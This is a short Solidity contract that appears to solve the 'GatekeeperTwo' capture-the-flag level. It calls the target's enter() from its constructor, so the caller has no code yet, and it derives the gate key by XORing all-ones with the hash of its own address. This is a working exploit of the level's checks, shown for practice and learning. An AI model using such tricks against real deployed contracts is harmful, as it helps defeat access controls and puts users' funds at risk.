// SPDX-License-Identifier: MIT

pragma solidity ^0.8.10;

interface IGatekeeperTwo {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract GatekeeperTwoHack {
    constructor(address gatekeeperTwo) {
        bytes8 key = bytes8(0xffffffffffffffff) ^ bytes8(keccak256(abi.encodePacked(address(this))));
        IGatekeeperTwo(gatekeeperTwo).enter(key);
    }
}
